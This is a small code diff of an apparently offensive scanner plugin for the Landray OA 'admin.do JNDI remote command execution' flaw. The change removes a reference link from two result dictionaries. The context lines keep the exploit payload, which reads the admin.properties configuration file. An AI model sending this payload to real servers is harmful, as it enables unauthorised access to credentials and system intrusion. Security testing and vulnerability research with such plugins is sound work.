@@ -6,8 +6,7 @@ def verify(url):
     result = {
         'name': '蓝凌OA admin.do JNDI远程命令执行',
         'vulnerable': False,
-        'attack': True,
-        'about': 'https://mp.weixin.qq.com/s/p1uHhUoUUKi7ESZdWR2nlQ',
+        'attack': True
     }
     payload_data = 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
     timeout = 3
@@ -28,8 +27,7 @@ def attack(url):
     result = {
         'name': '蓝凌OA admin.do JNDI远程命令执行',
         'vulnerable': False,
-        'attack': True,
-        'about': 'https://mp.weixin.qq.com/s/p1uHhUoUUKi7ESZdWR2nlQ',
+        'attack': True
     }
     payload_data = 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
     timeout = 3
